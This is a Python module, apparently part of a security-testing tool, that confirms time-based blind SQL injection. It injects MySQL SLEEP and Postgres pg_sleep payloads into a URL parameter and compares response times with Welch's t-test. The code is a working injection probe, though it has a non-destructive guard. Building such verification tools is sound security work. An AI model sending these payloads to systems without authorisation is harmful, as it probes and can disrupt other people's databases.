"""SQLi timing oracle via Welch's t-test.

Collects wall-clock response times for the original parameter (baseline)
and for a time-delay SQL injection payload (inject), then uses Welch's
independent-samples t-test to determine whether the timing difference is
statistically significant.

Statistical criterion (both must hold for ``validated``):
  - p < alpha  (reject the null hypothesis of equal means)
  - mean(inject) > mean(baseline) + delay_seconds * 0.5
"""

from __future__ import annotations

import contextlib
import math
import time
import urllib.parse
from typing import Any

import httpx
import structlog
from scipy import stats

from oracle_mcp.result import OracleResult
from oracle_mcp.security import reject_destructive_payload

log = structlog.get_logger("oracle_mcp.oracles")

# MySQL time-delay payload (Phase 1).
_MYSQL_PAYLOAD_TEMPLATE = "' OR SLEEP({delay})-- -"

# Postgres time-delay payload (Phase 1.1b).
_POSTGRES_PAYLOAD_TEMPLATE = "' OR pg_sleep({delay})-- -"


def _inject_param(url: str, param: str, value: str) -> str:
    """Return *url* with *param* set to *value* in the query string."""
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return parsed._replace(query=new_query).geturl()


async def _timed_get(client: httpx.AsyncClient, url: str) -> float:
    """Return the wall-clock seconds taken to complete a GET to *url*."""
    t0 = time.perf_counter()
    with contextlib.suppress(httpx.HTTPError):
        await client.get(url)
    return time.perf_counter() - t0


async def oracle_sqli(
    url: str,
    param: str,
    baseline_n: int = 7,
    inject_n: int = 7,
    delay_seconds: float = 5.0,
    alpha: float = 0.01,
    payload_type: str = "mysql",
) -> OracleResult:
    """Verify SQL injection via time-delay probing and Welch's t-test.

    Args:
        url: Target URL with *param* as a query-string key.
        param: Query-string parameter to inject the SQL payload into.
        baseline_n: Number of baseline (unmodified) requests.
        inject_n: Number of injected (time-delay) requests.
        delay_seconds: Seconds the SQL ``SLEEP`` should pause execution.
        alpha: Statistical significance threshold (default 0.01).
        payload_type: Database type - "mysql" or "postgres" (default "mysql").

    Returns:
        :class:`~oracle_mcp.result.OracleResult` with verdict
        ``validated`` or ``inconclusive``.
    """
    reject_destructive_payload(url)

    # Select payload template based on database type
    if payload_type.lower() == "postgres":
        inject_payload = _POSTGRES_PAYLOAD_TEMPLATE.format(delay=delay_seconds)
    else:
        inject_payload = _MYSQL_PAYLOAD_TEMPLATE.format(delay=delay_seconds)
    injected_url = _inject_param(url, param, inject_payload)

    # Timeout must exceed delay_seconds to allow the injected sleep to complete.
    http_timeout = delay_seconds + 10.0

    log.info(
        "sqli.oracle.start",
        url=url,
        param=param,
        baseline_n=baseline_n,
        inject_n=inject_n,
        delay_seconds=delay_seconds,
        alpha=alpha,
    )

    async with httpx.AsyncClient(timeout=http_timeout) as client:
        baseline_times: list[float] = []
        for i in range(baseline_n):
            t = await _timed_get(client, url)
            baseline_times.append(t)
            log.debug("sqli.baseline", i=i + 1, elapsed=t)

        inject_times: list[float] = []
        for i in range(inject_n):
            t = await _timed_get(client, injected_url)
            inject_times.append(t)
            log.debug("sqli.inject", i=i + 1, elapsed=t)

    baseline_mean = sum(baseline_times) / len(baseline_times)
    inject_mean = sum(inject_times) / len(inject_times)

    result = stats.ttest_ind(
        baseline_times,
        inject_times,
        equal_var=False,  # Welch's t-test
    )
    t_stat = float(result.statistic)
    p_value = float(result.pvalue)

    evidence: dict[str, Any] = {
        "baseline_mean": baseline_mean,
        "inject_mean": inject_mean,
        "p_value": None if math.isnan(p_value) else p_value,
        "t_stat": None if math.isnan(float(t_stat)) else float(t_stat),
        "n_baseline": baseline_n,
        "n_inject": inject_n,
        "delay_seconds": delay_seconds,
        "alpha": alpha,
        "param": param,
    }

    log.info(
        "sqli.oracle.stats",
        baseline_mean=baseline_mean,
        inject_mean=inject_mean,
        p_value=p_value,
        t_stat=t_stat,
    )

    # Treat NaN p-value (zero-variance samples) as inconclusive.
    if math.isnan(p_value):
        return OracleResult(
            verdict="inconclusive",
            oracle_method="sqli_timing_welch",
            evidence=evidence,
            reason="t-test produced NaN p-value (zero variance in samples)",
        )

    timing_threshold = delay_seconds * 0.5
    if p_value < alpha and inject_mean > baseline_mean + timing_threshold:
        return OracleResult(
            verdict="validated",
            oracle_method="sqli_timing_welch",
            evidence=evidence,
        )

    return OracleResult(
        verdict="inconclusive",
        oracle_method="sqli_timing_welch",
        evidence=evidence,
        reason=(
            f"p={p_value:.4f} >= alpha={alpha}"
            if p_value >= alpha
            else f"inject mean {inject_mean:.3f}s not > baseline mean "
            f"{baseline_mean:.3f}s + {timing_threshold:.1f}s threshold"
        ),
    )
